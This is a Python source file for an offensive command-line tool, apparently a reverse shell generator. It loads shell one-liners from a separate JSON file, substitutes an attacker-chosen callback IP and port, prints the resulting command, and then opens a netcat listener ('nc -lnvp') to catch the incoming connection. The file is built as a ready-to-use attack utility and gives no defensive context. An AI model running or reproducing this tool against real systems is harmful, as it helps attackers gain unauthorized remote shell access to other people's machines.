import json, os
from rich.console import Console; console = Console()

def banner():
    print(" _______  ________ ________  ______  ______ ")
    print("|       \|        \        \/      \|      \\")
    print("| ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓▓\▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓\\\▓▓▓▓▓▓")
    print("| ▓▓__/ ▓▓ ▓▓__      | ▓▓  | ▓▓__| ▓▓ | ▓▓  ")
    print("| ▓▓    ▓▓ ▓▓  \     | ▓▓  | ▓▓    ▓▓ | ▓▓  ")
    print("| ▓▓▓▓▓▓▓| ▓▓▓▓▓     | ▓▓  | ▓▓▓▓▓▓▓▓ | ▓▓  ")
    print("| ▓▓     | ▓▓_____   | ▓▓  | ▓▓  | ▓▓_| ▓▓_ ")
    print("| ▓▓     | ▓▓     \  | ▓▓  | ▓▓  | ▓▓   ▓▓ \\")
    print(" \▓▓      \▓▓▓▓▓▓▓▓   \▓▓   \▓▓   \▓▓\▓▓▓▓▓▓ \n")

def footer():
    console.print("[underline light_green]Usage:[/] petaiproject.py [[light_green]-h/--help[/]][[light_green]-l/--list[/]]  [-id [[light_green]REVERSE SHELL ID[/]]]  [-i [[light_green]IP ADDRESS[/]]]  [-p [[light_green]PORT[/]]]\n\n")
    console.print("[bold orange3 on black]Example:[/][on black]petaiproject.py -id 1 -i 10.10.10.10 -p 8888[/]")
    console.print("[bold orange3 on black]Example:[/][on black]petaiproject.py --id 1 --ip 10.10.10.10 --port 8888[/]\n")
    console.print("[red][!]Error[/]: Sorry, Try This '[light_green]-h/--help[/]'")

def help_me():
    console.print("\n[underline light_green]Usage:[/] petaiproject.py [[light_green]-h[/]][[light_green]-l[/]]  [[light_green]-id[/]]  [[light_green]-i[/]]  [[light_green]-p[/]]\n")
    console.print("[underline light_green]Optional Arguments:[/]")
    console.print("     -id, --id       The reverse shell ID")
    console.print("     -i,  --ip       Ip address for callback")
    console.print("     -p,  --port     Port for connection")
    console.print("\n[underline light_green]Options:[/]")
    console.print("     -h,  --help     show this help message and exit")
    console.print("     -l,  --list     list all of the reverse shell id")
    console.print("\n[bold orange3 on black]Example:[/][on black]petaiproject.py -id 1 -i 10.10.10.10 -p 8888[/]")
    console.print("[bold orange3 on black]Example:[/][on black]petaiproject.py --id 1 --ip 10.10.10.10 --port 8888[/]\n")

def shell(id, ip, port):
    with open("shell_list.json", 'r') as file:
        data = json.loads(file.read())
        for line in data["reverse_shell_list"]:
            if line['id'] == id:
                oneline = line['shell']
                r1 = oneline.replace("lhost", ip)
                r2 = r1.replace("lport", port)
                console.print(f"[bold light_green]The Command:[/] [white]{r2}[/]")
                print("---------------------------------------------------")
                console.print(f"[[light_green]X[/]] [bold gold1]stARt tHe lisTeNer oN {port}[/]")
                os.system(f"nc -lnvp {port}")
                break

